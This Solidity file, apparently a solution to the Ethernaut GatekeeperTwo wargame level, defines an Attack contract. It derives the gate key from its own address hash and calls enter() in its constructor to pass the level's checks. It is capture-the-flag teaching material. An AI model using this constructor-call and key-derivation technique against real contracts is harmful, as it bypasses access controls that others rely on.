// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Add the GatekeeperTwo contract interface or import statement here
interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attack {
    bytes8 public _GateKey = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF;
    GatekeeperTwo public gatekeeperTwo= GatekeeperTwo(0x8da028e8b115Dd9635b8F2ECaf58dD3Ad0FCdC92); // Replace with actual deployed address
    constructor() {
    gatekeeperTwo.enter(_GateKey);
    }

}

